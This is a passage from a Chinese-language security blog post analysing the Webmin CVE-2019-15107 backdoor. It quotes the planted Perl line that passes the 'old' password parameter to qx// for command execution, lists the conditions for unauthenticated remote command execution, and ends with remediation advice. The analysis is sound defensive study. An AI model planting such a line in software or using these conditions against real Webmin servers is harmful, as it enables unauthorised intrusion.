<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{} If True"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{} If False"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

run<span class="token punctuation">:</span>
<span class="token keyword">undef</span> If False
<span class="token punctuation">{</span><span class="token punctuation">}</span> If True
Process finished with exit code <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当user不存在的时候<code>$wuser</code>变量从<code>undef</code>变为<code>{}</code>会对后续代码造成影响吗，继续后续代码的分析</p>
<p>37-47行代码会对<code>$wuser</code>进行判断是否进入if条件中的webmin用户密码更新</p>
<pre class="line-numbers language-perl"><code class="language-perl"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true"># Update Webmin user's password</span>
    <span class="token variable">$enc</span> <span class="token operator">=</span> <span class="token variable">&amp;acl::encrypt_password</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'old'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$enc</span> <span class="token operator">eq</span> <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">||</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_eold'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">qx/$in{'old'}/</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$perr</span> <span class="token operator">=</span> <span class="token variable">&amp;acl::check_password_restrictions</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$perr</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">&amp;text</span><span class="token punctuation">(</span><span class="token string">'password_enewpass'</span><span class="token punctuation">,</span> <span class="token variable">$perr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token variable">&amp;acl::encrypt_password</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'temppass'</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token variable">&amp;acl::modify_user</span><span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$wuser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">&amp;reload_miniserv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>由于此时的<code>$wuser={}</code>，导致不存在的用户user会进入if条件进行密码更新，进入if条件后，会对用户输入的旧密码<code>old</code>与查询出列表中用户的密码进行对比，理所当然的，不存在的user到这里会自动执行<code>pass_error()</code>函数进行错误信息的打印与退出。</p>
<p>如果用户提交的<code>user</code>与<code>old</code>等参数都正确的情况下，会对webmin用户密码进行正常更新并重新加载webmin服务</p>
<pre class="line-numbers language-perl"><code class="language-perl"><span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token variable">&amp;acl::encrypt_password</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span>
<span class="token variable">&amp;acl::modify_user</span><span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$wuser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">&amp;reload_miniserv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这一系列代码功能的审计分析下来好像并没有发现什么问题，可是往往代码所引发的问题都会隐藏在某一个隐秘的角落中</p>
<pre class="line-numbers language-perl"><code class="language-perl"><span class="token variable">$enc</span> <span class="token operator">eq</span> <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">||</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_eold'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">qx/$in{'old'}/</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>仔细看来，会发现针对用户提交不存在的用户<code>user</code>或旧密码<code>old</code>错误的情况下会触发上面代码片段<code>pass_error()</code>进行错误信息打印，但是这个函数里面的参数是存在严重问题的，参数通过<code>$text{&#39;password_eold&#39;}</code>与<code>qx/$in{&#39;old&#39;}/</code>进行拼接，<code>$text{&#39;password_eold&#39;}</code>为正常一个字符串<code>&quot;The current password is incorrect&quot;</code>，而<code>qx/$in{&#39;old&#39;}/</code>则是一个可执行系统命令的代码片段！！！</p>
<p>在perl中，<code>qx//</code>的用法为执行系统命令</p>
<pre class="line-numbers language-bash"><code class="language-bash">root@rose:~<span class="token comment" spellcheck="true"># cat test.pl</span>
print<span class="token punctuation">(</span>qx/id/<span class="token punctuation">)</span><span class="token punctuation">;</span>
root@rose:~<span class="token comment" spellcheck="true"># perl test.pl</span>
uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> groups<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span>
root@rose:~<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>分析到这里，也就知道了为什么会造成未授权RCE漏洞。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>整理思路可知，漏洞利用条件可为如下几种</p>
<pre><code>1、开启密码重置功能【针对有些版本不需要开启密码重置功能，比如：webmin 1.890】
2、user不存在、old=任意字符|系统命令、new1==new2  
或者
user不存在、old=系统命令、new1==new2  
或者
user存在但不为特定系统用户【指webmin添加的系统用户】、old为假（任意字符|系统命令 或 系统命令）、new1==new2</code></pre><h1 id="漏洞后门"><a href="#漏洞后门" class="headerlink" title="漏洞后门"></a>漏洞后门</h1><p>回过头再仔细想来，为什么代码会对<code>old</code>参数执行命令呢，难道被植入了后门吗，查看官方的代码修复方案直接将<code>qx/$in{&#39;old&#39;}/</code>给删除了，同时对比官方GitHub与sourceforge下载的项目对比，发现Github项目下载的相同版本并没有<code>,qx/$in{&#39;old&#39;}/</code>该恶意片段。</p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020180355877.png" alt="image-20201020180355877"></p>
<p>事实上在2018年7月，就有人在GitHub上提到了有关问题，只是当时的版本为<code>1.890</code></p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020180158717.png" alt="image-20201020180158717"></p>
<p>分别从sourceforge与github上下载webmin 1.890项目，对比分析发现当时<code>sourceforge</code>上的webmin 1.890项目也存在后门，只是代码可执行的位置不同而已。</p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020181033173.png" alt="image-20201020181033173"></p>
<p>事实上针对sourceforge上webmin 1.890很明显被种植了后门，根本不需要开启密码重置功能，在<code>expired</code>参数中可直接执行系统命令</p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020181932867.png" alt="image-20201020181932867"></p>
<p>分析到这里，无疑SourceForge被入侵，致使攻击者修改了webmin项目代码留存后门。</p>
<p>类似后门事件很多，如：2019年phpstudy后门风波，事件起因于2016年官网被入侵，致使攻击者在phpstudy项目中留入后门<code>dll</code>文件，该事件当时在国内也是掀起了一番浪潮！！！</p>
<h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><ul>
<li><p>检查项目代码是否存在<code>qx//</code>后门，将其直接删除即可。</p>
</li>
<li><p>建议webmin项目尽量从官方github下载部署。</p>
</li>
</ul>
<h1 id="分析感想"><a href="#分析感想" class="headerlink" title="分析感想"></a>分析感想</h1><p>不担心项目开发存在问题，就担心官方项目被攻击者入侵植入后门！！！</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><pre class="line-numbers language-txt"><code class="language-txt">https://paper.seebug.org/1019/
https://www.anquanke.com/post/id/184668
https://xz.aliyun.com/t/6040
https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Qftm</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://Qftm.github.io/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/">http://Qftm.github.io/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint polocy. If reproduced, please indicate source
                    <a href="/about" target="_blank">Qftm</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Webmin/">
                                    <span class="chip bg-color">Webmin</span>
                                </a>
                            
                                <a href="/tags/Perl/">
                                    <span class="chip bg-color">Perl</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2020/12/01/command-execution-research-php/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/code-6.png" class="responsive-img" alt="命令执行底层原理探究-PHP">
                        
                        <span class="card-title">命令执行底层原理探究-PHP</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            针对不同平台/语言下的命令执行是不相同的，存在很大的差异性。因此，这里对不同平台/语言下的命令执行函数进行深入的探究分析。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2020-12-01
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/PHP%E5%AE%89%E5%85%A8/" class="post-category">
                                    PHP安全
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/PHP/">
                        <span class="chip bg-color">PHP</span>
                    </a>
                    
                    <a href="/tags/%E5%86%85%E6%A0%B8/">
                        <span class="chip bg-color">内核</span>
                    </a>
                    
                    <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
                        <span class="chip bg-color">命令执行</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/08/23/php-md5-bypass-audit/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/bypass-1.jpg" class="responsive-img" alt="PHP MD5 Bypass Trick">
                        
                        <span class="card-title">PHP MD5 Bypass Trick</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            前言该篇主要记录有关PHP代码中MD5逻辑缺陷的绕过技巧【update+ing】
PHP-逻辑类型PHP 类型比较表
弱类型-松散比较
弱类型比较

字符==：【不比较数据类型】、【仅比较数据值=&gt;数据值相同】
字符!=：【仅比较数据
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-23
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/PHP/">
                        <span class="chip bg-color">PHP</span>
                    </a>
                    
                    <a href="/tags/MD5/">
                        <span class="chip bg-color">MD5</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + 'From: Qftm<br />'
            + 'Author: Qftm<br />'
            + 'Link: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2018</span>
            <a href="/about" target="_blank">Qftm</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">370.8k</span>&nbsp;字
            
            
            
            
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/Qftm" 
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:Qftmbin@gmail.com" 
        <i class="fas fa-envelope-open"></i>
    </a>





    <a href="https://twitter.com/Qftmer" 
        <i class="fab fa-twitter"></i>
    </a>









</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/search.xml", 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    

    

    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
